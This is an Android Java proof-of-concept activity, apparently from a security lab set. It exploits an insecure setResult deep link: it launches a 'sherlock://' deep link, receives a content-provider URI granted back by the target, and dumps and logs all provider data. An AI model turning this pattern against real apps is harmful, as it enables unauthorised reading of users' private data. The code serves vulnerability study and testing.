package sherlock.poc.insecure_set_result;

import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.appcompat.app.AppCompatActivity;

public class DeeplinkActivity extends AppCompatActivity {

    private static final String TAG = "sherlock.poc.insecure_set_result.DeeplinkActivity";

    public static Intent newIntent(Context packageContext) {
        return new Intent(packageContext, DeeplinkActivity.class);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setAction("android.intent.action.VIEW");
        i.setData(Uri.parse("sherlock://insecure.set.result.deeplink/unsafe"));
        launcher.launch(i);
    }

    ActivityResultLauncher<Intent> launcher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> {
                if (result.getResultCode() == RESULT_OK) {
                    Intent data = result.getData();
                    Uri providerUri = data.getData();
                    Cursor c = getContentResolver().query(
                            providerUri,
                            null,
                            null,
                            null,
                            null
                    );
                    try {
                        if (c.getCount() == 0) {
                            return;
                        }
                        c.moveToFirst();
                        StringBuilder sb = new StringBuilder();
                        while (!c.isAfterLast()) {
                            for (int i = 0; i < c.getColumnCount(); i++) {
                                String providerData = c.getColumnName(i) + ":" + c.getString(i) + ";";
                                sb.append(providerData);
                            }
                            c.moveToNext();
                        }
                        Log.d(TAG, "Output: " + sb);
                    } finally {
                        c.close();
                    }
                }
            }
    );
}